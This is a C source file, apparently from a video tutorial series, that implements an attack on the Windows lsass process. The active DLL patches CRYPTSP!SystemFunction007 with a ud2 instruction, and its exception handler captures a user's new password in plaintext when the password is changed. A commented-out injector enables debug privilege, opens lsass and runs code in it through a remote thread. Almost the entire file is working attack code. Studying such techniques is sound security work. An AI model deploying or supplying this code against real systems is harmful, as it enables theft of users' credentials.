// Dark Mode Episode 002
// https://www.youtube.com/playlist?list=PLlaINRtydtNUwkwdmCBNtkwgVRda8Ya_G
// Joseph Ryan Ries
#pragma clang diagnostic ignored "-Wdeclaration-after-statement"
#include <Windows.h>
#include <stdio.h>
__declspec(dllexport) BOOL WINAPI DllMain(HINSTANCE inst, DWORD reason, LPVOID reserved);

static LONG CALLBACK GetHackedExceptionFilter(EXCEPTION_POINTERS* ex)
{
	if (ex->ExceptionRecord->ExceptionCode != 0xC000001D)
	{
		OutputDebugStringA("Exception was something other than illegal instruction.\n");		
		return(EXCEPTION_CONTINUE_SEARCH);
	}
	
	OutputDebugStringA("Illegal instruction exception!\n");
	wchar_t password_string[256] = { 0 };
	_snwprintf_s(password_string, sizeof(password_string) / sizeof(wchar_t), _TRUNCATE,  L"User's password was changed to: %s\n", *(wchar_t**)(ex->ContextRecord->Rcx + 8));
	OutputDebugStringW(password_string);
	ex->ContextRecord->Rip += 2; 
	return(EXCEPTION_CONTINUE_EXECUTION);
}



__declspec(dllexport) BOOL WINAPI DllMain(HINSTANCE inst, DWORD reason, LPVOID reserved)
{	
	UNREFERENCED_PARAMETER(inst);
	UNREFERENCED_PARAMETER(reserved);
	UNREFERENCED_PARAMETER(reason);

	if (reason == DLL_PROCESS_ATTACH)
	{
		OutputDebugStringA("Im inside ur lsass, hackin all ur data\n");
		SetUnhandledExceptionFilter(GetHackedExceptionFilter);
		OutputDebugStringA("Top Level Exception Filter set.\n");
		FARPROC sf7 = GetProcAddress(GetModuleHandle("CRYPTSP.dll"), "SystemFunction007");
		if (sf7 == NULL)
		{
			OutputDebugStringA("Unable to locate CRYPTSP!SystemFunction007\n");
			return(FALSE);
		}
		OutputDebugStringA("Found CRYPTSP!SystemFunction007.\n");
		// We are overwriting the first 5 bytes (48895c2418) at the beginning of SystemFunction007, which translates to (mov qword ptr [rsp+18h],rbx)
		// so 0f0b for ud2, then fill with 3 nops
		BYTE ud2[] = { 0x0F, 0x0B, 0x90, 0x90, 0x90 };
		DWORD protect;
		VirtualProtect((LPVOID)sf7, 5, PAGE_EXECUTE_READWRITE, &protect);
		memcpy((void*)sf7, ud2, 5);
		VirtualProtect((LPVOID)sf7, 5, protect, &protect);
		OutputDebugStringA("CRYPTSP!SystemFunction007 has been patched.\n");
	}

  return(TRUE);
}


/*
#pragma clang diagnostic ignored "-Wdeclaration-after-statement"
#include <Windows.h>
#include <TlHelp32.h>
#include <intrin.h>
#include <stdio.h>

static DWORD WINAPI RemoteWorkerThread(_In_ LPVOID lpParameter)
{
	UNREFERENCED_PARAMETER(lpParameter);
	HANDLE File = INVALID_HANDLE_VALUE;
	char* Message = "Hello from lsass!\n";
	DWORD NumBytesWritten = 0;

	File = CreateFileW(
		L"test.txt",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, 
		NULL);

	if (File != INVALID_HANDLE_VALUE)
	{
		WriteFile(File, Message, (DWORD)strlen(Message), &NumBytesWritten, NULL);
		CloseHandle(File);
	}

	return(0);
}

static LONG CALLBACK GetHackedExceptionFilter(EXCEPTION_POINTERS* ex)
{		
	printf("Hello from the exception filter!\n");

	ex->ContextRecord->Rip += 2;

	return(EXCEPTION_CONTINUE_EXECUTION);
}

int main(void)
{
	//SetUnhandledExceptionFilter(GetHackedExceptionFilter);
	//printf("The exception is coming up next...\n");
	//__ud2();
	//printf("We are now past the exception!\n");
	HANDLE CurrentProcessTokenHandle = INVALID_HANDLE_VALUE;
	LUID Luid = { 0 };
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };
	PROCESSENTRY32 ProcessEnumerator = { .dwSize = sizeof(PROCESSENTRY32) };
	HANDLE ProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	HANDLE TargetProcessHandle = INVALID_HANDLE_VALUE;
	void* RemoteMemory = NULL;
	static const int PayloadSize = (1024 * 512);

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &CurrentProcessTokenHandle);
	LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &Luid);
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Luid = Luid;
	TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(CurrentProcessTokenHandle, FALSE,	&TokenPrivileges,	0, (PTOKEN_PRIVILEGES)NULL,	(PDWORD)NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		printf("[-] Failed to enabled debug privilege!\n");
		return(1);
	}
	printf("[+] Debug privilege enabled.\n");
	Process32First(ProcessSnapshot, &ProcessEnumerator);
	while (Process32Next(ProcessSnapshot, &ProcessEnumerator) == TRUE)
	{
		if (_stricmp(ProcessEnumerator.szExeFile, "lsass.exe") == 0)
		{
			printf("[+] lsass process found with PID %lu.\n", ProcessEnumerator.th32ProcessID);
			TargetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessEnumerator.th32ProcessID);
			break;			
		}
	}
	if (TargetProcessHandle == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to locate or open lsass process!\n");
		return(1);
	}
	RemoteMemory = VirtualAllocEx(TargetProcessHandle, NULL, PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (RemoteMemory == NULL)
	{
		printf("[-] Failed to allocate remote memory!\n");
		return(1);
	}
	printf("[+] Memory allocated in remote process.\n");
	if (WriteProcessMemory(TargetProcessHandle, RemoteMemory, &RemoteWorkerThread, PayloadSize, 0) == 0)
	{
		printf("[-] Failed to write remote process memory! 0x%08lx\n", GetLastError());
		return(1);
	}
	printf("[+] Remote process memory written.\n");
	if (CreateRemoteThread(TargetProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteMemory, NULL, 0, NULL) == NULL)
	{
		printf("[-] Failed to create remote thraed! 0x%08lx\n", GetLastError());
		return(1);
	}
	printf("[+] Remote thread created.\n");

	
}
*/
